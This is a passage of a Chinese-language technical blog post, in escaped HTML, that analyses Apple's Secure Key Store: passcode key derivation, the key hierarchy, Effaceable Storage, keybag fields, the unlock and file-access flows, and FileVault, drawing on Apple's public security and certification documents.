class=\"headerlink\" title=\"3. 未获得 FIPS 140-2 批准的算法\"></a>3. 未获得 FIPS 140-2 批准的算法</h3><p>对于此类算法，Apple 规定<strong>不得与上述算法共享加密因子</strong>。</p>\n<ul>\n<li>基于 RSA 的密钥包裹协议：验证配件、VPN 连接和 iMessage 等场景中使用。填充方案采用 OAEP（<a href=\"https://en.wikipedia.org/wiki/Optimal_asymmetric_encryption_padding\">Optimal Asymmetric Encryption Padding</a>，最佳非对称加密填充）</li>\n<li>ECDH 密钥交换协议：使用了未被批准的 Curve25519 曲线，而且使用了密钥模块外部的加密因子。用于文件保护 B 类密钥管理、iCloud 云备份密钥管理、HomeKit 配件通信等场景。</li>\n<li>Ed25519 签名方案：使用了未被批准的 Curve25519 曲线。</li>\n<li><a href=\"https://datatracker.ietf.org/doc/html/rfc5869\">RFC 5869 HKDF</a>：使用了未被批准的、基于 HMAC 的密钥扩展算法。HomeKit 配件连接和 iMessage 等场景中使用。</li>\n<li><a href=\"(https://csrc.nist.gov/CSRC/media/Events/Key-Management-Workshop-2000/documents/x963_overview.pdf)\">ANSI X9.63</a> KDF：用于金融服务行业密钥协议和密钥传输，同样采用 Curve25519</li>\n<li>AES-GCM：IV 的生成方式不符合 FIPS 140-2</li>\n</ul>\n<blockquote>\n<p>事实上，Curve25519 已成为 P-256 的替代品。2024 年，NIST 宣布弃用 FIPS 186-4 并发布<a href=\"https://csrc.nist.gov/pubs/fips/186-5/final\">FIPS 186-5</a>，Curve25519 和 Curve448 被正式纳入规范，ANSI X9.62 也被 ANSI X9.142 替代</p>\n</blockquote>\n<h3 id=\"4-PBKDF2-算法\"><a href=\"#4-PBKDF2-算法\" class=\"headerlink\" title=\"4. PBKDF2 算法\"></a>4. PBKDF2 算法</h3><p>用户的锁屏密码 Passcode 的长度有限，不能直接作为密钥使用，必须经过密钥扩展（Password-Based Key Derivation）生成标准的 Passcode Key，参考<a href=\"https://csrc.nist.gov/pubs/sp/800/132/final\">SP 800-132</a>第 5.4 节的 2b 模式。</p>\n<p>基于<a href=\"Behind_the_Scenes_with_iOS_Security.pdf\">Behind the Scenes with iOS Security - Ivan Krstić</a>的描述，其处理步骤包括：</p>\n<ul>\n<li>初始阶段：Userspace 侧完成。使用 HMAC-SHA-256 作为伪随机函数<br>  输入：基于TRNG 生成的 128 位随机 salt、未经任何预处理的 passcode、<strong>迭代计数 1</strong><br>  输出：256 位的中间密钥 MK</li>\n<li>迭代阶段：SEP 侧完成。以 UID 为加密密钥，使用 AES-CBC-256 硬件重复迭代加密 MK，最终形成 Master Key<br>  迭代次数需要根据硬件环境校准，确保计算时间为 100-150 毫秒，迭代次数至少为 50000 次</li>\n</ul>\n<blockquote>\n<p>大量重复运算使得暴力破解的成本很高，而添加盐值可以有效防御彩虹表攻击。</p>\n</blockquote>\n<p><img src=\"/2024/04/07/Apple-Secure-Key-Store-%E7%A1%AC%E4%BB%B6%E5%8A%A0%E5%AF%86%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/KDF.png\" alt=\"KDF\"></p>\n<p>需要注意的是，不同版本硬件的算法和配置都可能发生变化：</p>\n<ul>\n<li>iOS 4 迭代算法与标准规范有差异，增加了将 256位 MK 扩展为 4096 位的环节</li>\n<li>iOS 4.3 升级了 Keybag 版本，v2 算法的 counter 更复杂</li>\n<li>Filevault 软件加密方式的迭代次数为 41000，但加密因子不包含 UID！</li>\n</ul>\n<p><img src=\"/2024/04/07/Apple-Secure-Key-Store-%E7%A1%AC%E4%BB%B6%E5%8A%A0%E5%AF%86%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/PBKDF2.png\" alt=\"PBKDF2\"></p>\n<h2 id=\"三、Secure-Key-Store-密钥层级\"><a href=\"#三、Secure-Key-Store-密钥层级\" class=\"headerlink\" title=\"三、Secure Key Store 密钥层级\"></a>三、Secure Key Store 密钥层级</h2><p>根据之前的 iOS4 破解技术分析，Apple 数据保护密钥的持久化存储有 4 种方式：</p>\n<ul>\n<li>SEP 内部：每个设备唯一且不可修改的UID，基于固定参数衍生的Key 0x89B 和 Key 0x835</li>\n<li>可擦除区域（effaceable storage）：EMF Key，Dkey 和 Bag1<br>  包裹状态密文保存在 NAND 的 Block 1，不提供额外的机密性保护，而是便于快速&#x2F;远程清除</li>\n<li>用户密钥包（User Keybag）：各类文件保护 Class key 和钥匙串 Class key<br>  包裹状态密文保存在一个普通的数据文件（plist格式），存储于<code>/var/keybags/systembag.kb</code></li>\n<li>per-file key 以包裹状态的密文存储在文件系统元数据中，keychain 的 item 以包裹状态保存在一个 sqlite 数据库，存储目录位于<code>/Users/&lt;UserName&gt;/Library/Keychains/</code></li>\n</ul>\n<p><img src=\"/2024/04/07/Apple-Secure-Key-Store-%E7%A1%AC%E4%BB%B6%E5%8A%A0%E5%AF%86%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/arch3.jpg\" alt=\"arch\"></p>\n<blockquote>\n<p>注意，系统密钥包<strong>不存储 Class D key</strong>！因为 NSFileProtectionNone 实际是一个单密钥系统，即：<code>per-file key = Class D key = AES_Unwrap(key 0x835，Dkey)</code></p>\n</blockquote>\n<h3 id=\"1-关键安全参数\"><a href=\"#1-关键安全参数\" class=\"headerlink\" title=\"1. 关键安全参数\"></a>1. 关键安全参数</h3><p><a href=\"Apple_iOS_16_iPhone_Security_Target_v1.1.pdf\">iOS 16 安全评估报告</a>的 P119 - P121，介绍了密钥管理的基本概念并提供了 CSP（Critical Security Parameter，关键安全参数）的列表信息，P125 提供了密钥层次结构图，与 iOS4 的描述基本一致，</p>\n<p><img src=\"/2024/04/07/Apple-Secure-Key-Store-%E7%A1%AC%E4%BB%B6%E5%8A%A0%E5%AF%86%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/TOC-key.png\" alt=\"TOC\"></p>\n<p><a href=\"Apple_Secure_Key_Store_Cryptographic_Module_with_Notes.pdf\">Apple SKS 加密模块</a>的 P20，也提供了关键安全参数 CSP 的生命周期列表：</p>\n<ul>\n<li><code>Root Encryption Key (REK)</code> &#x3D; Passcode Key，其描述为：<br>  Generation：Derived from passcode using PBKDF2 and entanglement with UID<br>  Entry and Output：Generated inside the module and is never output。</li>\n<li><code>Moudle-managed keybags key</code> <strong>不是 Bag1</strong>(因为其是明文存储方式)，而是指密钥包中存储的各种 Class key<br>  Generation: Symmetric key generation services of the module<br>  Entered encrypted using AES-256 KW, Output encrypted using AES-256 KW<br>  Non-volatile store: cryptographically zeroized when overwriting the KEK<br>  Volatile store: zeroized when freeing the secure memory</li>\n<li><code>File system object DEK</code> &#x3D; EMF</li>\n<li><code>Escrow Keybag and the class D key encryption key</code> &#x3D; Key 0x835</li>\n<li>CSP 列表没有提供 Key 0x89B 的信息</li>\n</ul>\n<blockquote>\n<p>Q1： CSP 列表的 <code>REK wrapping key</code> 应该就是 SKS 和 SBIO 之间的 random secret。<br>描述为：Entered&#x2F;Output in plaintext by calling application within physical the boundary。<br>random secret 在 SKS 和 SBIO 之间明文传输，但都处于 SEP 范围内，行为方式符合其描述</p>\n</blockquote>\n<h3 id=\"2-Effaceable-Storage\"><a href=\"#2-Effaceable-Storage\" class=\"headerlink\" title=\"2. Effaceable Storage\"></a>2. Effaceable Storage</h3><p>根据<a href=\"iPhone_Data_Protection_in_Depth.pdf\">iPhone Data Protection in Depth</a>的介绍，从 iPhone 3GS 开始，iPhone 内置的闪存芯片都最前面的 16 个 block 和最后的 15 个 block 保留给 Apple，并将 Block 1 作为 Effaceable Storage（可擦除区域），用于储存加密密钥的专用区域，可被直接寻址和安全擦除。</p>\n<p><img src=\"/2024/04/07/Apple-Secure-Key-Store-%E7%A1%AC%E4%BB%B6%E5%8A%A0%E5%AF%86%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/ES.png\" alt=\"effaceable storage\"></p>\n<p>Github 上有一个取证软件包可以读取早期的 iOS 系统数据，请参见<a href=\"https://github.com/nabla-c0d3/iphone-dataprotection\">https://github.com/nabla-c0d3/iphone-dataprotection</a>。</p>\n<p>浅蓝色是 length ，红色是 tag 标记，注意 HFS 是大端字节顺序，字符串要反着读。<br>第一个标记：0x42414731 &#x3D; BAG1，长度 0x0034 &#x3D; 52 个字节<br>第二个标记：0xC46B6579 &#x3D; key，长度 0x0028 &#x3D; 40 个字节<br>第三个标记：0xC54D4621 &#x3D; EMF!，长度 0x0024 &#x3D; 36 个字节<br>第四个标记：0x444F4E45 &#x3D; DONE，长度 0x0000，这就是结束了！</p>\n<p><img src=\"/2024/04/07/Apple-Secure-Key-Store-%E7%A1%AC%E4%BB%B6%E5%8A%A0%E5%AF%86%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/ES2.png\" alt=\"effaceable storage\"></p>\n<p>尽管当攻击者实际占有设备时，可擦除存储器无法提供保护（事实上 OS 可以直接读取该区域），但其中存储的密钥作为密钥层级的一部分，可以实现快速擦除和前向安全性。</p>\n<p><img src=\"/2024/04/07/Apple-Secure-Key-Store-%E7%A1%AC%E4%BB%B6%E5%8A%A0%E5%AF%86%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/ES3.png\" alt=\"effaceable storage\"></p>\n<h3 id=\"3-密钥包\"><a href=\"#3-密钥包\" class=\"headerlink\" title=\"3. 密钥包\"></a>3. 密钥包</h3><p>文件和钥匙串数据保护类的密钥均在密钥包中收集和管理。<strong>Secure Key Store</strong>负责管理系统密钥包，并且可以查询设备的锁定状态，只有当系统密钥包中的所有类密钥都可以访问并且已成功解开包装时，设备才会解锁。</p>\n<p>User keybag 是设备常规操作中使用的封装类密钥的储存位置（与 passcode 相关），设备密钥包用来储存用于涉及设备特定操作数据的封装类密钥（仅与 UID 相关），两者合称为系统密钥包。<br>配置为单用户使用 (默认配置) 的 iOS 和 iPadOS 设备中，设备密钥包和用户密钥包是同一个。</p>\n<p>此外，还有用于备份、托管和 iCloud 云备份的几种的密钥包，item 包含了一些其他密钥，但数据结构完全相同。请参考<a href=\"https://github.com/russtone/systembag.kb\">https://github.com/russtone/systembag.kb</a>。<br><a href=\"Behind_the_Scenes_with_iOS_Security.pdf\">Behind the Scenes with iOS Security - Ivan Krstić</a>的 P27，也给出了一个示例。</p>\n<p><img src=\"/2024/04/07/Apple-Secure-Key-Store-%E7%A1%AC%E4%BB%B6%E5%8A%A0%E5%AF%86%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/keybag2.png\" alt=\"keybag\"></p>\n<p>密钥包的头部字段包括：</p>\n<ul>\n<li>VERS：版本号，iOS 12 之后都置为 4</li>\n<li>TYPE：该密钥包的类型，[0-system，1-backup，2-escrow，3-iCloud Backup]</li>\n<li>UUID：该密钥包的 UUID</li>\n<li>HMCK：如果密钥包已签名，保存 HMAC 校验值</li>\n<li>WRAP：包裹方式，[1:仅 UID 派生, 2:仅 passcode 派生, 3:两者都有]</li>\n<li>SALT：PBKDF2 算法使用的盐</li>\n<li>ITER：PBKDF2 算法的迭代次数</li>\n</ul>\n<blockquote>\n<p>不同版本可能出现 GRCE、GRNT、TKMT、SART 等字段，信息含义未知</p>\n</blockquote>\n<p>对于每个密钥包的条目（文件保护类密钥 &amp; 钥匙串类密钥），其字段包括：</p>\n<ul>\n<li>CLAS：class，密钥的级别<br>  文件保护类型为[1,2,3]：4-空缺，就是Dkey；5-保留未启用；<br>  钥匙串保护类型为[6,7,8,9,10,11]：对应钥匙串的 3 个级别和相应的 device only</li>\n<li>WRAP：wraping type，包裹方式。与 Header 定义一致</li>\n<li>KTPY：key type。例如 Curve25519</li>\n<li>WPKY：wrapped key。如果是非对称密钥，此处存储的是 Private key</li>\n<li>PBKY：public key（可选）。Class B 的 Pulic key，包裹状态</li>\n<li>UUID：该密钥的 UUID</li>\n</ul>\n<p>关于密钥包的解封流程，<a href=\"Apple_Secure_Key_Store_Cryptographic_Module_with_Notes.pdf\">Apple SKS 加密模块</a>的 P23 指出：</p>\n<ul>\n<li>所有在钥匙包中、由加密模块管理的密钥，由 Device OS 负责存储在 non-volatile memory 中。</li>\n<li>密钥包基于 256 位的 AES-KW 包裹算法，然后输出到 Device OS 完成持久化存储（permanent storage）。</li>\n<li>设备加电启动后，加密模块从 Device OS 导入包裹状态的密钥包并完成解封。</li>\n</ul>\n<p>P14 描述了基于密码的身份验证工作模式：</p>\n<ul>\n<li>当用户从模块请求加密服务时，它必须提供密码和对用户密钥包的引用，该密钥包在 SKS 内的 SP800-38F AES 密钥包装 (AES-KW) 下加密存储。该模块使用 PBKDF 从操作者提供的密码中派生 AES 密钥。</li>\n<li>然后，模块的 SP800-38F AES 密钥解包功能（即 AES-KW-AD）使用派生的 AES 密钥来解密参考用户密钥包并验证解密密钥的真实性。<br>  由于 AES-KW 是一种身份验证密码，因此解密操作只有在没有身份验证错误的情况下才会成功。这意味着用户提供了正确的密码来导出用于 AES 密钥解包的正确 AES 密钥。<br>  任何其他密码都将派生出不同的 AES 密钥，这将导致解密的用户密钥错误，导致身份验证检查失败。</li>\n<li>如果可以成功解开用户密钥包，则用户将通过模块的身份验证，然后将使用解开的用户密钥继续执行所请求的加密服务。<br>  解包用户密钥包失败也是用户身份验证失败，操作员将被拒绝访问模块。</li>\n</ul>\n<h2 id=\"四、Secure-Key-Store-业务逻辑\"><a href=\"#四、Secure-Key-Store-业务逻辑\" class=\"headerlink\" title=\"四、Secure Key Store 业务逻辑\"></a>四、Secure Key Store 业务逻辑</h2><p><a href=\"Apple_iOS_16_iPhone_Security_Target_v1.1.pdf\">iOS 16 安全评估报告</a>的 P125-P127，介绍了SEP启动、第一次解锁、文件处理等核心业务场景的处理逻辑，结合<a href=\"Behind_the_Scenes_with_iOS_Security.pdf\">Behind the Scenes with iOS Security - Ivan Krstić</a>的 P31-P34 的流程图，做个简要分析。</p>\n<h3 id=\"1-系统启动\"><a href=\"#1-系统启动\" class=\"headerlink\" title=\"1. 系统启动\"></a>1. 系统启动</h3><p><img src=\"/2024/04/07/Apple-Secure-Key-Store-%E7%A1%AC%E4%BB%B6%E5%8A%A0%E5%AF%86%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/boot.jpg\" alt=\"File\"></p>\n<ul>\n<li>SEP 使用 NDRBG 生成一个<code>临时封装密钥</code>，并通过专用线路传送给 NVM 控制器的 AES 引擎</li>\n<li>XNU（操作系统内核）的 AppleKeyStore 从 Effaceable storage 加载包裹状态的 EMF key 和 Dkey</li>\n<li>SEP 持有<code>Key 0x835</code>解封<code>Dkey</code>，将 Class D key 加入 Keyring</li>\n<li>SEP 使用<code>临时封装密钥</code>重新包裹 Class D key，<strong>用于后续该类型文件的统一解密密钥</strong></li>\n<li>XNU 加载系统分区表和文件系统元数据，发送给 SEP</li>\n<li>SEP 持有<code>Key 0x89B</code>解封<code>EMF key</code>，持有<code>media key</code>解密文件系统元数据，并返回给 XNU</li>\n</ul>\n<p>现在 Userspace 就可以正确处理 Class D 类型的文件了，然后是处理密钥包：</p>\n<ul>\n<li>用户空间启动<code>keybagd</code>系统进程，读取无保护的数据文件<code>/var/keybags/systembag.kb</code></li>\n<li><code>keybagd</code>从 Effaceable storage 加载 keybag prot key（即：Bag1，明文），并完成文件级解封</li>\n<li><code>keybagd</code>将解封后的密钥包发送给 SEP，SKS 将 Class B 的 Public key 加入 Keyring</li>\n</ul>\n<p>此时，SKS 就可以<strong>新建 Class B 类型文件</strong>（但不能读取已有文件，因为没有 Private key）；此外，SKS 安全内存中还有仍处于包裹状态的 Class A key、Class B 的 Private key 和 Class C key，需要等待第一次解锁！</p>\n<h3 id=\"2-首次解锁\"><a href=\"#2-首次解锁\" class=\"headerlink\" title=\"2. 首次解锁\"></a>2. 首次解锁</h3><p><img src=\"/2024/04/07/Apple-Secure-Key-Store-%E7%A1%AC%E4%BB%B6%E5%8A%A0%E5%AF%86%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/first-unlock.jpg\" alt=\"File\"></p>\n<ul>\n<li>用户空间的 SpringBoard（用户解锁界面）获得 passcode，通过 XNU 的 AppleKeyStore 发送给 SEP</li>\n<li>SEP 的 Secure Key Store 基于 PBKDF2 算法生成 master key（即 Passcode key 或 REK）</li>\n<li>基于 master key XOR Dkey 解封密钥包，如果校验成功则将 Boot 阶段未完成的 3 个类密钥加入 Keyring</li>\n</ul>\n<p>此时 SKS 就可以正确处理所有类型的文件了，然后是处理 Touch ID：</p>\n<ul>\n<li>SEP 的 SKS 随机生成一个 random secret</li>\n<li>SKS 使用 random secret 包裹 master key，并保存在 SEP 内部</li>\n<li>SKS 将 random secret 发送 SBIO</li>\n<li>SKS 从内存中销毁 master key</li>\n</ul>\n<p>这样以来，后续在没有输入 passcode 的情况下，可以使用 Touch ID 来恢复类密钥。</p>\n<h3 id=\"3-系统锁定\"><a href=\"#3-系统锁定\" class=\"headerlink\" title=\"3. 系统锁定\"></a>3. 系统锁定</h3><p><img src=\"/2024/04/07/Apple-Secure-Key-Store-%E7%A1%AC%E4%BB%B6%E5%8A%A0%E5%AF%86%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/lock.jpg\" alt=\"File\"></p>\n<p>如果用户界面触发了系统锁定事件，SKS 将从 Keyring 中删除 Class A key 和 Class B 的 private key。<br>注意！此时 Class C key 仍然可用，因为已经成功完成一次解锁。</p>\n<h3 id=\"4-指纹解锁\"><a href=\"#4-指纹解锁\" class=\"headerlink\" title=\"4. 指纹解锁\"></a>4. 指纹解锁</h3><p><img src=\"/2024/04/07/Apple-Secure-Key-Store-%E7%A1%AC%E4%BB%B6%E5%8A%A0%E5%AF%86%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/touch-id-unlock.jpg\" alt=\"File\"></p>\n<ul>\n<li>用户按压 Home 键时，启动指纹传感器</li>\n<li>指纹传感器匹配已存储模版，如果检测成功，SEP 的 SBIO 将 random secret 发送给 SKS</li>\n<li>SKS 根据 random secret 解封获得 master key，并将 Class A key 和 Class B 的 private key 添加到 Keyring</li>\n</ul>\n<p>现在，SKS 又可以准确处理所有文件了。</p>\n<h3 id=\"5-读取文件\"><a href=\"#5-读取文件\" class=\"headerlink\" title=\"5. 读取文件\"></a>5. 读取文件</h3><p><img src=\"/2024/04/07/Apple-Secure-Key-Store-%E7%A1%AC%E4%BB%B6%E5%8A%A0%E5%AF%86%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/file.jpg\" alt=\"File\"></p>\n<p>上图是一个简要描述，<a href=\"Apple_iOS_16_iPhone_Security_Target_v1.1.pdf\">iOS 16 安全评估报告</a>的 P126 提供了更详细的步骤，但似乎存在一些偏差，后续有勘误分析！</p>\n<ul>\n<li>XNU 首先提取文件元数据（使用 EMF 密钥加密），并将其发送到 SEP</li>\n<li>SEP 持有 EMF 密钥，据此解密文件元数据，并将其发送回 XNU</li>\n<li>XNU 判断文件保护类型，并将文件密钥（用类密钥包裹）和<strong>类密钥标记</strong>发送到 SEP</li>\n<li>SEP 解开文件密钥，使用临时密钥重新包裹，并将其返回 XNU</li>\n<li>XNU 将文件访问请求（读&#x2F;写）与重新包裹的文件密钥一起发送到存储控制器。</li>\n<li>存储控制器使用其内部的 AES 硬件解密文件密钥，然后在从闪存传输数据或向闪存传输数据期间解密（读取操作时）或加密（写入操作时）数据</li>\n</ul>\n<h2 id=\"五、-Secure-Key-Store-服务接口\"><a href=\"#五、-Secure-Key-Store-服务接口\" class=\"headerlink\" title=\"五、 Secure Key Store 服务接口\"></a>五、 Secure Key Store 服务接口</h2><p><a href=\"Apple_Secure_Key_Store_Cryptographic_Module_with_Notes.pdf\">Apple SKS 加密模块</a>的 P15-P17，提供了 SKS 系统服务清单。</p>\n<h3 id=\"1-完全符合-FIPS-140-2-的系统服务\"><a href=\"#1-完全符合-FIPS-140-2-的系统服务\" class=\"headerlink\" title=\"1. 完全符合 FIPS 140-2 的系统服务\"></a>1. 完全符合 FIPS 140-2 的系统服务</h3><ol>\n<li>文件系统服务（Class D File System Services）：无保护类型文件的系统（读&#x2F;写）服务<br> Key wrapping: UID，AES Key used to wrap Class D Key（key 0x835），Class D Key<br> File system keys：DEK（EMF 或 VEK）<br> Storage controller key：KEK（ DMA临时密钥 ）</li>\n<li>用户密钥包服务（User Keybag Services）：从 Device OS 导入包裹状态的用户密钥包<br> Keybag wrapping：AES Key shared with NVM Storage Controller<br> Keybag content：KEK</li>\n<li>设备密钥包服务（Device Keybag Services）：<br> Keybag wrapping: UID,AES Keys as part of module-managed keybags<br> Keybag content: KEK<br> Keychain keys: DEK<br> Sign&#x2F;verify key: ECDSA Private Key</li>\n<li>备份密钥包服务（Backup Keybag Services）：<br> Keybag wrapping：AES Key used to wrap Backup Keybag，PBKDF password for Backup Keybag，PBKDF Salt for Backup Keybag<br> Keybag content: KEK<br> Backup keys: DEK</li>\n<li>托管密钥包服务（Escrow Keybag Services）：<br> Keybag wrapping：AES Key used to wrap Escrow Keybag<br> Keybag content：KEK from User Keybag，DEK</li>\n<li>iCloud密钥包服务（iCloud Keybag Services）：<br> Keybag wrapping：REK derived from UID<br> Keybag content：DEK</li>\n<li>创建REK（Create REK）：<br> 加密因子：UID，PBKDF Password，PBKDF Salt for REK，DRBG internal state，Entropy input string，REK，KEK as AES key used to wrap REK</li>\n<li>更新REK（Update REK）：<br> 加密因子：UID，Old&#x2F;new PBKDF Password，PBKDF Salt for REK，DRBG internal state，Entropy input string，Old&#x2F;new REK derived from PBKDF Password</li>\n<li>生成密钥对（Generate Ref-Keys）：<br> 加密因子：EC Key Pair，Password，PBKDF Salt for EC Private Key Encryption Key</li>\n<li>生成共享密钥（Generate Shared Secret using EC keys generated by the module）：<br>加密因子：EC Key Pair，Password，PBKDF Salt for EC Private Key Encryption Key</li>\n<li>出厂重置（Erase all content）：清除 UID 之外的所有密钥和关键因子</li>\n<li>重启自检（Reboot that implies Self-test）：</li>\n<li>显示状态（Show Status）：</li>\n</ol>\n<h3 id=\"2-不符合-FIPS-140-2-的系统服务\"><a href=\"#2-不符合-FIPS-140-2-的系统服务\" class=\"headerlink\" title=\"2. 不符合 FIPS 140-2 的系统服务\"></a>2. 不符合 FIPS 140-2 的系统服务</h3><ol>\n<li>Generate Shared Secret using EC keys generated outside of the module</li>\n<li>Ed 25519 Digital signature generation</li>\n<li>Hash based KDF based on ANSI X9.63</li>\n<li>EC Diffie-Hellman Key Agreement using curve 25519</li>\n<li>RFC 5869 based HKDF</li>\n<li>AES-GCM Encryption and Decryption X</li>\n</ol>\n<h2 id=\"六、MacOS-FileVault-的技术分析\"><a href=\"#六、MacOS-FileVault-的技术分析\" class=\"headerlink\" title=\"六、MacOS FileVault 的技术分析\"></a>六、MacOS FileVault 的技术分析</h2><p>与 iPhone OS 相比，MacOS 的加密技术方案 FileVault 有着明显差异，一是仅支持单密钥的 FDE 加密方案，而非数据保护技术的 FBE 加密方案；二是 Macbook 长期使用 Intel CPU，硬件加密只能采用 T2 安全芯片的外挂方案。</p>\n<p>NIAP 根据 CC 安全标准定义了 FDE 的保护配置文件，请参见<a href=\"https://www.niap-ccevs.org/Profile/PP.cfm\">https://www.niap-ccevs.org/Profile/PP.cfm</a>，其核心功能组件分别为 AA（Authorization Acquisition，授权获取）和 EE（Encryption Engine，加密引擎），可以由不同的供应商提供组合能力。<br><img src=\"/2024/04/07/Apple-Secure-Key-Store-%E7%A1%AC%E4%BB%B6%E5%8A%A0%E5%AF%86%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/FDE1.png\" alt=\"FDE\"></p>\n<p>一般来说，AA 和 EE 的运行环境可能会根据其运行平台的启动阶段而有所不同，初始化方面以及可能的授权可以在 Pre-Boot 中执行，同时配置、加密、解密和管理功能可能在 OS 中执行。</p>\n<p><img src=\"/2024/04/07/Apple-Secure-Key-Store-%E7%A1%AC%E4%BB%B6%E5%8A%A0%E5%AF%86%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/FDE2.png\" alt=\"FDE\"></p>\n<p>AA 组件有三种类型的加密因子，分别是设备厂商提供的硬件密钥，用户提供的 passcode，和 TRNG 随机生成的 salt，共同构成了机密性保护。<br>根据 <a href=\"Apple_MacOS_13_Ventura_FileVault_Security_Target.pdf\">TOE 评估报告 - MacOS 13：FileVault</a>，P9 指出了 Apple 自研 CPU 负责实现 AA 和 EE 的全部功能，而 Intel CPU 只负责 AA 的 Password Acquisition 功能的实例化，其他核心功能仍然由 T2 安全芯片提供，具体对比见下图。</p>\n<p><img src=\"/2024/04/07/Apple-Secure-Key-Store-%E7%A1%AC%E4%BB%B6%E5%8A%A0%E5%AF%86%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/filevault2.png\" alt=\"Intel\"><br><img src=\"/2024/04/07/Apple-Secure-Key-Store-%E7%A1%AC%E4%BB%B6%E5%8A%A0%E5%AF%86%E6%8A%80%E6%9C%AF%E5%88%86%E6%9E%90/filevault1.png\" alt=\"M1\"></p>\n<h2 id=\"七、几个问题的讨论\"><a href=\"#七、几个问题的讨论\" class=\"headerlink\" title=\"七、几个问题的讨论\"></a>七、几个问题的讨论</h2><h3 id=\"1-安全存储组件的数据保存在哪里？\"><a href=\"#1-安全存储组件的数据保存在哪里？\" class=\"headerlink\" title=\"1. 安全存储组件的数据保存在哪里？\"></a>1. 安全存储组件的数据保存在哪里？</h3><p>根据<a href=\"https://help.apple.com/pdf/security/zh_CN/apple-platform-security-guide-cn.pdf\">Apple平台安全保护-2022</a>的表述：</p>\n<ul>\n<li>虽然安全隔区不含储存设备，但它拥有一套将信息安全储存在所连接储存设备上的机制，<strong>该储存设备与应用程序处理器和操作系统使用的 NAND 闪存互相独立</strong>。</li>\n<li>安全隔区配备了<strong>专用的安全非易失性存储器设备</strong>。安全非易失性存储器通过专用的 I2C 总线与安全隔区连接，因此它仅可被安全隔区访问。所有用户数据加密密钥植根于储存在安全隔区非易失性存储器中的熵内。</li>\n<li>在未配备安全储存组件的架构上，<strong>EEPROM（电可擦除可编程只读存储器）被用于为安全隔区提供安全储存服务</strong>。跟安全储存组件类似，EEPROM 连接到安全隔区并仅可从安全隔区访问，但其不包含专用的硬件安全性功能，不能确保对熵的独有访问权限（除了其物理连接特性），也不具备计数器加密箱功能。</li>\n</ul>\n<p>总结一下，安全存储组件（Secure Storage Component）的（持久化）存储设备是一个专用芯片（早期是 EEPROM，但<strong>绝对不是 NAND 的 Effaceable Storage</strong>），通过专用 I2C 总线与安全隔区连接，即 Secure Encalve 标注的<strong>安全非易失性存储器（Secure nonvolatile storage）</strong>！</p>\n<h3 id=\"2-安全存储组件管理了哪些核心数据？\"><a href=\"#2-安全存储组件管理了哪些核心数据？\" class=\"headerlink\" title=\"2. 安全存储组件管理了哪些核心数据？\"></a>2. 安全存储组件管理了哪些核心数据？</h3><p>根据<a href=\"https://help.apple.com/pdf/security/zh_CN/apple-platform-security-guide-cn.pdf\">Apple平台安全保护-2022</a>的表述：</p>\n<ul>\n<li>搭载 A12、 S4 及后续型号 SoC 的设备并用了安全隔区与<strong>安全储存组件来储存熵</strong>。安全储存组件本身设计为使用不可更改的 ROM 代码、硬件随机数生成器、<strong>每个设备唯一的加密密钥</strong>、加密引擎和物理篡改检测。安全隔区和安全储存组件使用加密且认证的协议通信以提供对熵的独有访问权限。</li>\n<li>2020 年秋季或之后首次发布的设备（为抵御重放攻击）配备了第二代安全储存组件。第二代安全储存组件增加了计数器加密箱（和 xART 机制）。<strong>每个计数器加密箱储存一个 128 位盐、一个 128 位密码验证器、一个 8 位计数器，以及一个 8 位最大尝试值</strong>。对计数器加密箱的访问通过加密且认证的协议来实现。</li>\n<li>计数器加密箱中含有所需用于解锁受密码保护用户数据的熵。若要访问用户数据，<strong>配对的安全隔区必须从用户的密码和安全隔区的 UID 中派生出正确的密码熵值</strong>。从除配对安全隔区之外其他来源发送的解锁尝试均无法获知用户的密码。如果密码的尝试次数超过限制（例如，在 iPhone 上为 10 次），安全储存组件就会完全抹掉受密码保护的数据。</li>\n<li>为了创建计数器加密箱，安全隔区会向安全储存组件发送密码熵值和最大尝试次数值。安全储存组件会使用其随机数生成器生成盐值。之后<strong>通过提供的密码熵、安全储存组件的唯一加密密钥和盐值派生出密码验证器值和加密箱熵值</strong>。安全储存组件使用计数 0、提供的最大尝试次数值、派生的密码验证器值和盐值来初始化计数器加密箱。之后<strong>安全储存组件将生成的加密箱熵值返回到安全隔区</strong>。</li>\n<li>对于搭载 A9 或后续型号 SoC 的设备，该 .plist 文件（密钥包）包含一个密钥，表示密钥包储存在受<strong>反重放随机数（由安全隔区控制）</strong>保护的有锁储存库中。</li>\n</ul>\n<p>做个初步的分析。</p>\n<ol>\n<li>密码熵值和加密箱熵值在安全隔区和安全存储之间传递，这是一个标准的双向鉴权流程。<br> 密码熵值可以肯定就是 Passcode Key，加密箱熵值估计是系统密钥包的 SART 字段，即安全白皮书介绍的 A9 设备的新增密钥。<br> 早期版本的 HMCK 字段保存签名信息，但目标是密钥包内容的完整性，而非反重放攻击。</li>\n<li>核心密钥全部由 Secure Key Store 管理，安全储存组件仅负责存储一些关键的安全参数，包括：反重放随机数（区别于系统密钥包中、用于 REK 的 Salt）、密码验证器、计数器和最大尝试值等，这些数据不以任何形式输出，为 xART 机制提供额外的机密性。</li>\n<li>安全储存组件的唯一加密密钥（即 xART key）的构造方式不清楚，猜测是一个 UID 的固定衍生密钥（如果是原生密钥，就需要额外考虑持久化存储方式）。</li>\n</ol>\n<h3 id=\"3-操作系统绑定密钥的工作机制？\"><a href=\"#3-操作系统绑定密钥的工作机制？\" class=\"headerlink\" title=\"3. 操作系统绑定密钥的工作机制？\"></a>3. 操作系统绑定密钥的工作机制？</h3><p>SKP（Sealed Key 